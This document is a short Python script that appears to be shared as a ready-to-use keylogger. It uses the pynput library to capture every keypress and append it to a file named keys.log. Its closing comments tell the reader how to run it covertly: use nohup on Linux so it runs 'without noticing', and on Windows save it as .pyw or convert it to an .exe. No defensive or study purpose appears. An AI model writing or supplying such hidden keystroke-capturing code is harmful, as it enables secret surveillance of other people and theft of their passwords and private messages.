#   @aryainjas
#importing libraries
from pynput.keyboard import Key, Listener
keys = []
def on_keypress(key):

    keys.append(key)
    for key in keys:
        log_keys(key)
#helper
def log_keys(key):
    
    with open("keys.log", 'a') as logfile:
        
        key = str(key).replace("'", "")
        
        if key.find("backspace") > 0:
            logfile.write(" backspcae ")
        elif key.find("space") > 0:
            logfile.write(" ")
        elif key.find("shift") > 0:
            logfile.write(" shift ")
        elif key.find("enter") > 0:
            logfile.write("\n")
        elif key.find("caps_lock") > 0:
            logfile.write(" capslock ")
        else:
            logfile.write(key)
       
        keys.clear()
with Listener(on_press=on_keypress) as listener :
     listener.join()

#if you are using this on linux just install the necessary libs
#use nohup command for run it without noticing :)
#on windows save the .py file and change the format to .pyw or simply turn it into .exe using 3rd party apps.
